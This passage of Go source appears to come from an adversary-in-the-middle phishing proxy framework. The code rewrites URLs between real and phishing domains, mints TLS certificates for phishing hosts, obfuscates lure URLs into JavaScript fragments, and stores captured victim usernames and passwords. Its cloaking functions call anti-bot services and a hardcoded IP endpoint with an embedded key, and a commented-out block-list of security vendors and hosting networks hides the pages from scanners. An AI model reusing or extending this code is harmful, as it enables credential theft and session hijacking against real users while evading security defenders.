					params, err := url.ParseQuery(string(dec_params))
					if err == nil {
						for kk, vv := range params {
							log.Debug("param: %s='%s'", kk, vv[0])

							session.Params[kk] = vv[0]
						}
						ret = true
						break
					}
				} else {
					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
				}
			}
		}
	}

	return ret
}

func (p *HttpProxy) replaceHtmlParams(body, lure_url string, params *map[string]string) string { //nolint:gocritic // false positive

	// generate forwarder parameter
	t := make([]byte, 5)
	_, err := rand.Read(t[1:])
	if err != nil {
		log.Error("rand.Read: %v", err)
	}
	var crc byte = 0
	for _, b := range t[1:] {
		crc += b
	}
	t[0] = crc
	fwd_param := base64.RawURLEncoding.EncodeToString(t)

	lure_url += "?" + GenRandomString(1) + "=" + fwd_param

	for k, v := range *params {
		key := "{" + k + "}"
		body = strings.ReplaceAll(body, key, html.EscapeString(v))
	}
	var js_url string
	n := 0
	for n < len(lure_url) {
		t := make([]byte, 1)
		_, err := rand.Read(t)
		if err != nil {
			log.Error("rand.Read: %v", err)
		}
		rn := int(t[0])%3 + 1

		if rn+n > len(lure_url) {
			rn = len(lure_url) - n
		}

		if n > 0 {
			js_url += " + "
		}
		js_url += "'" + lure_url[n:n+rn] + "'"

		n += rn
	}

	body = strings.ReplaceAll(body, "{cookie_key}", p.cfg.cookie_key)
	body = strings.ReplaceAll(body, "{ cookie_key }", p.cfg.cookie_key)
	body = strings.ReplaceAll(body, "{lure_url_html}", lure_url)
	body = strings.ReplaceAll(body, "{lure_url_js}", js_url)
	body = strings.ReplaceAll(body, "{ lure_url_html }", lure_url)
	body = strings.ReplaceAll(body, "{ lure_url_js }", js_url)
	body = strings.ReplaceAll(body, "{ turnstile_sitekey }", p.cfg.turnstile_sitekey)
	body = strings.ReplaceAll(body, "{ recaptcha_sitekey }", p.cfg.recaptcha_sitekey)
	body = strings.ReplaceAll(body, "{turnstile_sitekey}", p.cfg.turnstile_sitekey)
	body = strings.ReplaceAll(body, "{recaptcha_sitekey}", p.cfg.recaptcha_sitekey)


	return body
}

func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
	re_url := regexp.MustCompile(MATCH_URL_REGEXP)
	re_ns_url := regexp.MustCompile(MATCH_URL_REGEXP_WITHOUT_SCHEME)

	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
		var sub_map map[string]string = make(map[string]string)
		var hosts []string
		for _, ph := range pl.proxyHosts {
			var h string
			if c_type == CONVERT_TO_ORIGINAL_URLS {
				h = combineHost(ph.phish_subdomain, phishDomain)
				sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
			} else {
				h = combineHost(ph.orig_subdomain, ph.domain)
				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
			}
			hosts = append(hosts, h)
		}
		// make sure that we start replacing strings from longest to shortest
		sort.Slice(hosts, func(i, j int) bool {
			return len(hosts[i]) > len(hosts[j])
		})

		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			u, err := url.Parse(s_url)
			if err == nil {
				for _, h := range hosts {
					if strings.EqualFold(u.Host, h) {
						s_url = strings.Replace(s_url, u.Host, sub_map[h], 1)
						break
					}
				}
			}
			return s_url
		}))
		body = []byte(re_ns_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			for _, h := range hosts {
				if strings.Contains(s_url, h) && !strings.Contains(s_url, sub_map[h]) {
					s_url = strings.Replace(s_url, h, sub_map[h], 1)
					break
				}
			}
			return s_url
		}))
	}
	return body
}

func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
	return func(host string, _ *goproxy.ProxyCtx) (c *tls.Config, err error) {
		parts := strings.SplitN(host, ":", 2)
		hostname := parts[0]
		port := 443
		if len(parts) == 2 {
			port, _ = strconv.Atoi(parts[1])
		}

		if !p.developer {
			// check for lure hostname
			cert, err := p.crt_db.GetHostnameCertificate(hostname)
			if err != nil {
				// check for phishlet hostname
				pl := p.getPhishletByOrigHost(hostname)
				if pl != nil {
					phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
					if ok {
						cert, err = p.crt_db.GetPhishletCertificate(pl.Name, phishDomain)
						if err != nil {
							return nil, err
						}
					}
				}
			}
			if cert != nil {
				return &tls.Config{
					InsecureSkipVerify: true,
					Certificates:       []tls.Certificate{*cert},
					Renegotiation:      tls.RenegotiateFreelyAsClient,
				}, nil
			}
			log.Debug("no SSL/TLS certificate for host '%s'", host)
			return nil, fmt.Errorf("no SSL/TLS certificate for host '%s'", host)
		} else {
			var ok bool
			phish_host := ""
			if !p.cfg.IsLureHostnameValid(hostname) {
				phish_host, ok = p.replaceHostWithPhished(hostname)
				if !ok {
					log.Debug("phishing hostname not found: %s", hostname)
					return nil, fmt.Errorf("phishing hostname not found")
				}
			}

			cert, err := p.crt_db.SignCertificateForHost(hostname, phish_host, port)
			if err != nil {
				return nil, err
			}
			return &tls.Config{
				InsecureSkipVerify: true,
				Certificates:       []tls.Certificate{*cert},
				Renegotiation:      tls.RenegotiateFreelyAsClient,
			}, nil
		}
	}
}

func (p *HttpProxy) setSessionUsername(sid, username string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetUsername(username)
	}
}

func (p *HttpProxy) setSessionPassword(sid, password string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetPassword(password)
	}
}

func (p *HttpProxy) setSessionCustom(sid, name, value string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetCustom(name, value)
	}
}

func (p *HttpProxy) Start() error {
	go p.httpsWorker()
	return nil
}

func (p *HttpProxy) httpsWorker() {
	var err error

	p.sniListener, err = net.Listen("tcp", p.Server.Addr)
	if err != nil {
		log.Fatal("%s", err)
		return
	}

	p.isRunning = true
	for p.isRunning {
		c, err := p.sniListener.Accept()
		if err != nil {
			log.Error("Error accepting connection: %s", err)
			continue
		}

		go func(c net.Conn) {
			now := time.Now()
			err := c.SetReadDeadline(now.Add(httpReadTimeout))
			if err != nil {
				log.Error("SetReadDeadline: %v", err)
			}
			err = c.SetWriteDeadline(now.Add(httpWriteTimeout))
			if err != nil {
				log.Error("SetWriteDeadline: %v", err)
			}

			tlsConn, err := vhost.TLS(c)
			if err != nil {
				return
			}

			hostname := tlsConn.Host()
			if hostname == "" {
				return
			}

			if !p.cfg.IsActiveHostname(hostname) {
				log.Debug("hostname unsupported: %s", hostname)
				return
			}

			hostname, _ = p.replaceHostWithOriginal(hostname)

			req := &http.Request{
				Method: "CONNECT",
				URL: &url.URL{
					Opaque: hostname,
					Host:   net.JoinHostPort(hostname, "443"),
				},
				Host:       hostname,
				Header:     make(http.Header),
				RemoteAddr: c.RemoteAddr().String(),
			}
			resp := dumbResponseWriter{tlsConn}
			p.Proxy.ServeHTTP(resp, req)
		}(c)
	}
}

func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return pl
				}
			}
		}
	}
	return nil
}

func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return pl
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				pl, err := p.cfg.GetPhishlet(l.Phishlet)
				if err == nil {
					return pl
				}
			}
		}
	}

	return nil
}

func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return prefix + combineHost(ph.orig_subdomain, ph.domain), true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == ph.domain {
					return prefix + phishDomain, true
				}
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return phishDomain, true
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				phishDomain, ok := p.cfg.GetSiteDomain(l.Phishlet)
				if ok {
					return phishDomain, true
				}
			}
		}
	}

	return "", false
}

func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return ph.phish_subdomain, true
				}
			}
		}
	}
	return "", false
}

func (p *HttpProxy) handleSession(hostname string) bool {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					if ph.handle_session || ph.is_landing {
						return true
					}
					return false
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				return true
			}
		}
	}

	return false
}

func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
	if l.OgDescription != "" || l.OgTitle != "" || l.OgImageUrl != "" || l.OgUrl != "" {
		head_re := regexp.MustCompile(`(?i)(<\s*head\s*>)`)
		var og_inject string
		og_format := "<meta property=\"%s\" content=\"%s\" />\n"
		if l.OgTitle != "" {
			og_inject += fmt.Sprintf(og_format, "og:title", l.OgTitle)
		}
		if l.OgDescription != "" {
			og_inject += fmt.Sprintf(og_format, "og:description", l.OgDescription)
		}
		if l.OgImageUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:image", l.OgImageUrl)
		}
		if l.OgUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:url", l.OgUrl)
		}

		body = []byte(head_re.ReplaceAllString(string(body), "<head>\n"+og_inject))
	}
	return body
}
func (p *HttpProxy) deleteRequestCookie(name string, req *http.Request) {
	if cookie := req.Header.Get("Cookie"); cookie != "" {
		re := regexp.MustCompile(`(` + name + `=[^;]*;?\s*)`)
		new_cookie := re.ReplaceAllString(cookie, "")
		req.Header.Set("Cookie", new_cookie)
	}
}

func (p *HttpProxy) whitelistIP(ip_addr, sid string) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()
	p.ip_whitelist[ip_addr] = time.Now().Add(10 * time.Minute).Unix()
	p.ip_sids[ip_addr] = sid
}

func (p *HttpProxy) isWhitelistedIP(ip_addr string) bool {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()
	ct := time.Now()
	if ip_t, ok := p.ip_whitelist[ip_addr]; ok {
		et := time.Unix(ip_t, 0)
		return ct.Before(et)
	}
	return false
}

func (p *HttpProxy) getSessionIdByIP(ip_addr string) (string, bool) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()
	sid, ok := p.ip_sids[ip_addr]
	return sid, ok
}

func (p *HttpProxy) setProxy(enabled bool, ptype, address string, port int, username, password string) error {
	if enabled {
		ptypes := []string{"http", "https", "socks5", "socks5h"}
		if !stringExists(ptype, ptypes) {
			return fmt.Errorf("invalid proxy type selected")
		}
		if address == "" {
			return fmt.Errorf("proxy address can't be empty")
		}
		if port == 0 {
			return fmt.Errorf("proxy port can't be 0")
		}

		u := url.URL{
			Scheme: ptype,
			Host:   address + ":" + strconv.Itoa(port),
		}

		if strings.HasPrefix(ptype, "http") {
			var dproxy *http_dialer.HttpTunnel
			if username != "" {
				dproxy = http_dialer.New(&u, http_dialer.WithProxyAuth(http_dialer.AuthBasic(username, password)))
			} else {
				dproxy = http_dialer.New(&u)
			}
			p.Proxy.Tr.Dial = dproxy.Dial //nolint:staticcheck // DialContext not available
		} else {
			if username != "" {
				u.User = url.UserPassword(username, password)
			}

			dproxy, err := proxy.FromURL(&u, nil)
			if err != nil {
				return err
			}
			p.Proxy.Tr.Dial = dproxy.Dial //nolint:staticcheck // DialContext not available
		}

	} else {
		p.Proxy.Tr.Dial = nil //nolint:staticcheck // DialContext not available
	}
	return nil
}

type dumbResponseWriter struct {
	net.Conn
}

func (dumb dumbResponseWriter) Header() http.Header {
	panic("Header() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Write(buf []byte) (int, error) {
	if bytes.Equal(buf, []byte("HTTP/1.0 200 OK\r\n\r\n")) {
		return len(buf), nil // throw away the HTTP OK response from the faux CONNECT request
	}
	return dumb.Conn.Write(buf)
}

func (dumb dumbResponseWriter) WriteHeader(code int) {
	panic("WriteHeader() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
}

func (p *HttpProxy) Is_Real_Visitor_Killbot(from_ip, useragent string) bool {
	type KillbotResponse struct {
		Data struct {
			IsBot bool `json:"is_bot"`
		} `json:"data"`
		Meta struct {
			Code    int    `json:"code"`
			Message string `json:"message"`
		} `json:"meta"`
	}

	baseData := &BaseHTTPRequest{
		Method: "GET",
		Url:    fmt.Sprintf("https://killbot.org/api/v2/blocker?apikey=%v&ip=%v&ua=%v", url.QueryEscape(p.cfg.GetKillBotApikey()), url.QueryEscape(from_ip), url.QueryEscape(useragent)),
		Client: p.HttpClient,
	}

	resp, err := baseData.MakeRequest()
	if err != nil {
		log.Error("Error making request to killbot endpoint: %+v", err)
		return false
	}
	killbot_resp := KillbotResponse{}
	err = json.Unmarshal(resp, &killbot_resp)
	if err != nil {
		log.Error("%v", err)
	}

	if killbot_resp.Meta.Code != 200 && killbot_resp.Meta.Message != "OK" {
		log.Debug("killbot response was %d instead of 200. (%s)", killbot_resp.Meta.Code, killbot_resp.Meta.Message)
	}

	return !killbot_resp.Data.IsBot
}

func (p *HttpProxy) Is_Real_Visitor_Antibot(from_ip, useragent string) bool {
	type AntibotpwResponse struct {
		IsBot  bool `json:"is_bot"`
		Status bool `json:"status"`
	}

	baseData := &BaseHTTPRequest{
		Method: "GET",
		Url:    fmt.Sprintf("https://antibot.pw/api/v2-blockers?ip=%v&apikey=%v&ua=%v", url.QueryEscape(p.cfg.GetAntiBotPwApikey()), url.QueryEscape(from_ip), url.QueryEscape(useragent)),
		Client: p.HttpClient,
	}

	resp, err := baseData.MakeRequest()
	if err != nil {
		log.Error("Error making request to antibot.pw endpoint: %+v", err)
		return false
	}
	antibotpw_resp := AntibotpwResponse{}
	err = json.Unmarshal(resp, &antibotpw_resp)
	if err != nil {
		log.Error("%v", err)
	}

	return !antibotpw_resp.IsBot
}

/*

func (p *HttpProxy) Is_Real_Visitor_IPinfo(from_ip string) bool {
	type IPinfoResponse struct {
		Org   string `json:"org"`
		Bogon bool   `json:"bogon"`
	}

	baseData := &BaseHTTPRequest{
		Method: "GET",
		Url:    fmt.Sprintf("http://ipinfo.io/%v/json", url.QueryEscape(from_ip)),
		Client: p.HttpClient,
	}

	resp, err := baseData.MakeRequest()
	if err != nil {
		log.Error("Error making request to ipinfo (simplebot) endpoint: %+v", err)
		return false
	}

	ipinfo_resp := IPinfoResponse{}
	err = json.Unmarshal(resp, &ipinfo_resp)
	if err != nil {
		log.Error("%v", err)
	}

	if ipinfo_resp.Bogon {
		return true
	}

	if len(ipinfo_resp.Org) == 0 {
		log.Error("IPinfo organization field isn't present in response: %+v", ipinfo_resp)
		return false
	}

	blocked_orgs := []string{"Google", "Microsoft", "Forcepoint", "Mimecast", "ZSCALER", "Fortinet", "Amazon", "PALO ALTO", "RIPE", "McAfee", "M247", "Internap", "AS205100", "YISP", "Kaspersky", "Berhad", "DigitalOcean", "IP Volume", "Markus", "ColoCrossing", "Norton", "Datacamp Limited", "Scalair SAS", "NForce Entertainment", "Wintek Corporation", "ONLINE S.A.S.", "WestHost", "Labitat", "Orange Polska Spolka Akcyjna", "OVH SAS", "DediPath", "AVAST", "GoDaddy", "SunGard", "Netcraft", "Emsisoft", "CHINANET", "Rackspace", "Selectel", "Sia Nano IT", "AS1257", "Zenlayer", "Hetzner", "AS51852", "TalkTalk Communications", "Spectre Operations", "VolumeDrive", "Powerhouse Management", "HIVELOCITY", "SoftLayer Technologies", "AS3356", "AS855", "AS7459", "AS42831", "AS61317", "AS5089", "Faction", "Plusnet", "Total Server", "AS262997", "AS852", "Guanghuan Xinwang", "AS174", "AS45090", "AS41887", "Contabo", "IPAX", "AS58224", "AS18002", "HangZhou", "Linode", "AS6849", "AS34665", "SWIFT ONLINE BORDER", "AS38511", "AS131111", "Telefonica del Peru", "BRASIL S.A", "Merit Network", "Beijing", "QuadraNet", "Afrihost", "Vimpelcom", "Allstream", "Verizon", "HostRoyale", "Hurricane Electric", "AS12389", "Packet Exchange", "AS52967", "AS45974", "Fastweb", "AS17552", "Alibaba", "AS12978", "AS43754", "CariNet", "AS28006", "Free Technologies", "DataHata", "GHOSTnet", "AS55720", "Emerald Onion", "AS208323", "AS6730", "AS11042", "AS53667", "AS28753", "AS28753", "Globalhost d.o.o", "AS133119", "Huawei", "FastNet", "AS267124", "BKTech", "Optisprint", "AS24151", "Pogliotti", "321net", "AS4800", "Kejizhongyi", "SIMBANET", "AS42926", "Web2Objects", "AS12083", "AS62041", "AS8075", "AS203020", "AS63949", "AS9009","Google","Microsoft","Forcepoint","Mimecast","ZSCALER","Fortinet","Amazon","PALO ALTO","RIPE","McAfee","M247","Internap","AS205100","YISP","Kaspersky","Berhad","DigitalOcean","IP Volume","Markus","ColoCrossing","Norton","Datacamp Limited","Scalair SAS","NForce Entertainment","Wintek Corporation","ONLINE S.A.S.","WestHost","Labitat","Orange Polska Spolka Akcyjna","OVH SAS","DediPath","AVAST","GoDaddy","SunGard","Netcraft","Emsisoft","CHINANET","Rackspace","Selectel","Sia Nano IT","AS1257","Zenlayer","Hetzner","AS51852","TalkTalk Communications","Spectre Operations","VolumeDrive","Powerhouse Management","HIVELOCITY", "SoftLayer Technologies","AS3356","AS855","AS7459","AS42831","AS61317","AS5089","Faction","Plusnet","Total Server","AS262997","AS852","Guanghuan Xinwang","AS174","AS45090","AS41887","Contabo","IPAX","AS58224","AS18002","HangZhou","Linode","AS6849","AS34665","SWIFT ONLINE BORDER","AS38511","AS131111","Telefonica del Peru","BRASIL S.A","Merit Network","Beijing","QuadraNet","Afrihost","Vimpelcom","Allstream","Verizon","HostRoyale","Hurricane Electric","AS12389","Packet Exchange","AS52967","AS45974","Fastweb","AS17552","Alibaba","AS12978","AS43754","CariNet","AS28006","Free Technologies","DataHata","GHOSTnet","AS55720","Emerald Onion","AS208323","AS6730","AS11042","AS53667","AS28753","AS28753","Globalhost d.o.o","AS133119","Huawei","FastNet","AS267124","BKTech","Optisprint","AS24151","Pogliotti","321net","AS4800","Kejizhongyi","SIMBANET","AS42926","Web2Objects","AS12083"}
	for _, org := range blocked_orgs {
		org = strings.ToLower(org)
		ipinfo_resp.Org = strings.ToLower(ipinfo_resp.Org)
		if strings.Contains(ipinfo_resp.Org, org) || strings.Contains(org, ipinfo_resp.Org) {
			return false
		}
	}
	return true
}

*/

func (p *HttpProxy) Is_Real_Visitor_Nkpbot(ip, ua string) bool {
	type NkpResponse struct {
		Success bool `json:"success"`
		Code    int  `json:"code"`
		Real    bool `json:"real"`
	}

	rawIn := json.RawMessage(fmt.Sprintf(`{"ip":"%v","gateKey":"totRRhwz77FKN57TPZmCElBrFkLRydWL","ua":"%v"}`, url.QueryEscape(ip), url.QueryEscape(ua)))
	reqBody, err := rawIn.MarshalJSON()
	if err != nil {
		return false
	}
	baseData := &BaseHTTPRequest{
		Method: "POST",
		Url:    "http://185.156.172.15:3000/query/api/v1/full",
		Input:  reqBody,
		JSON:   true,
		Client: p.HttpClient,
	}

	resp, err := baseData.MakeRequest()
	if err != nil {
		log.Error("Error making request to nkpbot endpoint: %+v", err)
		return false
	}
	nkp_resp := NkpResponse{}
	err = json.Unmarshal(resp, &nkp_resp)
	if err != nil {
		log.Error("%v", err)
	}

	return nkp_resp.Real
}

type CaptchaValidatedResp struct {
	Success     bool          `json:"success"`
	ChallengeTs string        `json:"challenge_ts"`
	Hostname    string        `json:"hostname"`
	ErrorCodes  []interface{} `json:"error-codes"`
	Action      string        `json:"action"`
	Cdata       string        `json:"cdata"`
}

func (p *HttpProxy) ValidateTurnstileCaptcha(ip, response string) bool {
	dataToValidate := url.Values{
		"secret":   []string{p.cfg.turnstile_privkey},
		"response": []string{response},
		"remoteip": []string{ip},
	}

	validation_resp, err := http.PostForm("https://challenges.cloudflare.com/turnstile/v0/siteverify", dataToValidate)
	if err != nil {
		log.Error("turnstile validation request: %v", err)
		return false
	}

	res := &CaptchaValidatedResp{}
	json.NewDecoder(validation_resp.Body).Decode(&res) // trunk-ignore(golangci-lint/errcheck)
	defer validation_resp.Body.Close()
	fmt.Printf("%#v\n", res)

	if !res.Success {
		log.Error("validation response unsuccessful: %v", res.ErrorCodes...)
		return false
	}

	if !strings.Contains(p.cfg.baseDomain, res.Hostname) {
		log.Error("captcha validation provided unsupported hostname: %v, expecting it to be a substring of %v. err: %v", res.Hostname, p.cfg.baseDomain, fmt.Sprintf("%v", res.ErrorCodes...))
		return false
	}
	return true
}

func (p *HttpProxy) ValidateRecaptcha(ip, response string) bool {
	dataToValidate := url.Values{
		"secret":   []string{p.cfg.recaptcha_sitekey},
		"response": []string{response},
		"remoteip": []string{ip},
	}

	validation_resp, err := http.PostForm("https://www.google.com/recaptcha/api/siteverify", dataToValidate)
	if err != nil {
		log.Error("turnstile validation request: %v", err)
		return false
	}

	res := &CaptchaValidatedResp{}
	json.NewDecoder(validation_resp.Body).Decode(&res) // trunk-ignore(golangci-lint/errcheck)
	defer validation_resp.Body.Close()
	fmt.Printf("%#v\n", res)

	if !res.Success {
		log.Error("validation response unsuccessful: %v", res.ErrorCodes...)
		return false
	}

	if !strings.Contains(p.cfg.baseDomain, res.Hostname) {
		log.Error("captcha validation provided unsupported hostname: %v, expecting it to be a substring of %v. err: %v", res.Hostname, p.cfg.baseDomain, fmt.Sprintf("%v", res.ErrorCodes...))
		return false
	}
	return true
}

// Get the IP address of the server's connected user.
func GetUserIP(_ http.ResponseWriter, httpServer *http.Request) (userIP string) {
	if len(httpServer.Header.Get("CF-Connecting-IP")) > 1 {
		userIP = httpServer.Header.Get("CF-Connecting-IP")
		userIP = net.ParseIP(userIP).String()
	} else if len(httpServer.Header.Get("X-Forwarded-For")) > 1 {
		userIP = httpServer.Header.Get("X-Forwarded-For")
		userIP = net.ParseIP(userIP).String()
	} else if len(httpServer.Header.Get("X-Real-IP")) > 1 {
		userIP = httpServer.Header.Get("X-Real-IP")
		userIP = net.ParseIP(userIP).String()
	} else {
		userIP = httpServer.RemoteAddr
		if strings.Contains(userIP, ":") {
			userIP = net.ParseIP(strings.Split(userIP, ":")[0]).String()
		} else {
			userIP = net.ParseIP(userIP).String()
		}
	}
	return userIP
}
